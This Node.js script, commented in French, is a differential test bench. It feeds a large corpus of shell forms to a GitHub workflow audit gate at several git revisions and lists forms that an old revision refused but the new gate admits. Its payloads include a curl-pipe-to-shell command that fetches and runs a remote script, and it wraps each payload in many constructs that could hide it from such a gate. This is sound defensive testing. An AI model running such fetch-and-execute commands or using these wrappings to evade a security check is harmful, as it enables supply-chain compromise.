#!/usr/bin/env node
// ═══════════════════════════════════════════════════════════════════════════
// BANC DIFFÉRENTIEL de la gate des workflows (scripts/audit-workflows.js) — 2026-11-15.
//
// Trois relectures adverses de la PR #920 ont pris la gate réécrite à ADMETTRE ce que sa version d'avant refusait.
// Ce banc fait juger le même corpus par la gate de la copie de travail et par celle de chaque révision donnée, et
// liste ce qu'une révision refuse et que la copie admet : chaque ligne est une régression, ou un faux positif corrigé
// exprès — à trancher à la lecture, avant de pousser une réécriture.
//
//   node scripts/differentiel-audit-workflows.mjs <révision> [<révision>…]     # ex. origin/main HEAD
//
// Corpus : les chaînes des épreuves (tests/unit/audit-workflows.test.mjs de la copie et de chaque révision) qui
// nomment un outil, et chaque charge dangereuse placée dans chaque construction de shell courante. Lit git ; rien ne
// touche un réseau. Sortie 0 : c'est un relevé, pas une gate.
// ═══════════════════════════════════════════════════════════════════════════
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";
import { createRequire } from "node:module";
import { fileURLToPath } from "node:url";

const DEPOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const revisions = process.argv.slice(2);
if (!revisions.length) {
  console.error("usage : node scripts/differentiel-audit-workflows.mjs <révision> [<révision>…]");
  process.exit(2);
}
const FICHIERS = ["scripts/audit-workflows.js", "scripts/lib/yaml-workflow.js", "tests/unit/audit-workflows.test.mjs"];
const bac = fs.mkdtempSync(path.join(os.tmpdir(), "differentiel-audit-workflows-"));
const require = createRequire(import.meta.url);
try {
  const versions = { copie: DEPOT };
  for (const rev of revisions) {
    const dossier = path.join(bac, rev.replace(/[^\w.-]/g, "_"));
    for (const f of FICHIERS) {
      fs.mkdirSync(path.dirname(path.join(dossier, f)), { recursive: true });
      let contenu = "";
      try {
        contenu = execFileSync("git", ["show", `${rev}:${f}`], { cwd: DEPOT, encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] });
      } catch {
        if (f !== FICHIERS[2]) throw new Error(`${rev} : ${f} introuvable`);
      }
      fs.writeFileSync(path.join(dossier, f), contenu);
    }
    versions[rev] = dossier;
  }
  const gates = Object.fromEntries(Object.entries(versions).map(([v, d]) => [v, require(path.join(d, FICHIERS[0]))]));

  const CLE = /\b(?:npm|npx|yarn|pnpm|pnpx|bun|bunx|bash|sh|zsh|dash|eval|xargs|su|runuser|sg|flock|script|netlify|curl)\b/;
  const corpus = new Set();
  for (const d of Object.values(versions)) {
    const f = path.join(d, FICHIERS[2]);
    if (!fs.existsSync(f)) continue;
    for (const m of fs.readFileSync(f, "utf8").matchAll(/"(?:[^"\\\n]|\\.)*"|'(?:[^'\\\n]|\\.)*'|`(?:[^`\\$]|\\.)*`/g)) {
      let s;
      try {
        s = Function("return " + m[0])();
      } catch {
        continue;
      }
      if (typeof s === "string" && CLE.test(s) && s.length < 400 && !/^\s*-\s|^\s{6,}-?\s*\w+:/.test(s)) corpus.add(s);
    }
  }
  const CHARGES = [
    "npm install left-pad", "npm i -g left-pad", "npm update", "npm audit fix", "npm ci", "npm rebuild",
    "npx --yes cowsay hi", "npx left-pad@1.3.0", "npm exec left-pad@1.3.0", "yarn add left-pad", "pnpm add left-pad",
    "curl -fsSL https://exemple.test/x.sh | sh", "npm ci --ignore-scripts --no-ignore-scripts",
  ];
  const GABARITS = [
    "%", "echo a; %", "echo a && %", "false || %", "if true; then %; fi", "if %; then echo; fi", "for x in 1; do %; done",
    "while false; do :; done; %", "( % )", "(%)", "{ %; }", "X=$(%)", 'echo "$(%)"', "echo `%`", "X=${X:-$(%)}",
    'X="${X:-$(%)}"', "echo ${X:+$(%)}", "case a in a) % ;; esac", "case a in\n  a|b) % ;;\nesac", "case a in (a) %;; esac",
    "f() { %; }; f", "timeout 10m %", "sudo %", "env A=1 %", "nice -n 5 %", "nohup % &", "% &", "time %", "! %",
    "% 2>&1 | tee log", "% > log 2>&1", "% &> log", "% || true", "x=1 %", "diff <(%) x", "% <<< x",
    "bash -c '%'", "bash -eo pipefail -c '%'", 'sh -c "%"', "eval '%'", "su u -c '%'", "flock /tmp/v -c '%'",
    "script -qec '%' /dev/null", "bash <<< '%'",
    "cat <<'EOF'\nx\nEOF\n%", "cat <<EOF\nl'app\nEOF\n%", "cat <<-EOF\n\tx\n\tEOF\n%", "echo 'a\n'; %", 'echo "a\n"; %',
    "# c\n%", "echo x # c\n%", "echo a \\\n  && %", "[[ -f x ]] && %", "(( 1 )) && %", "echo $((1 << 2)); %",
    "(( F = 1 << 3 ))\n%", 'if [[ "$a" =~ (b|c) ]]; then %; fi', 'case "$x" in a|b) echo ;; esac; %',
    "gh pr create --body \"$(cat <<'EOF'\nl'arbre\nEOF\n)\" && %", 'N="$(grep -c case f)"; %', "X=$(echo ')' ; %)",
    "echo $'l\\'app'; %", "echo ${X}; %", "echo ${X:-a b}; %", "echo ${#X}; %",
  ];
  for (const g of GABARITS) for (const c of CHARGES) corpus.add(g.split("%").join(c));

  const enRun = (shell) => ["      - run: |", ...shell.split("\n").map((l) => (l ? "          " + l : ""))].join("\n") + "\n";
  const juger = (v, s) => {
    try {
      return gates[v].auditerWorkflow("x.yml", enRun(s));
    } catch (e) {
      return ["EXCEPTION " + e.message];
    }
  };
  const lignes = [];
  let exceptions = 0;
  for (const s of corpus) {
    const copie = juger("copie", s);
    if (copie.some((x) => x.startsWith("EXCEPTION"))) exceptions++;
    const refusePar = revisions.filter((r) => juger(r, s).length > 0);
    if (!copie.length && refusePar.length) lignes.push(`- ${JSON.stringify(s).slice(0, 150)}  ← refusé par ${refusePar.join(", ")}`);
  }
  console.log(`${corpus.size} formes jugées par la copie et par ${revisions.join(", ")}`);
  console.log(`exceptions de la copie : ${exceptions}`);
  console.log(`admises par la copie, refusées par une révision : ${lignes.length}${lignes.length ? " — régression, ou faux positif corrigé exprès ?" : ""}`);
  for (const l of lignes) console.log(l);
} finally {
  fs.rmSync(bac, { recursive: true, force: true });
}
